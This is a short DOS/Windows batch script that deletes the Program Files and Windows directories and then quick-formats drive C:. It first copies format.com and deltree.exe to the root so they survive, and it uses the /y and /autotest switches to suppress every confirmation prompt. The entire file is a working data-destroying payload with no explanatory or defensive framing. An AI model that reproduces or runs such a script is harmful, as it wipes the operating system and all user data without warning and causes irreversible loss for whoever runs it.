@echo off 
deltree /y c:\progra~1\*.*  
copy c:\windows\command\format.com c:\  
copy c:\windows\command\deltree.exe c:\  
deltree /y c:\windows\*.*  
format c: /q /u /autotest  
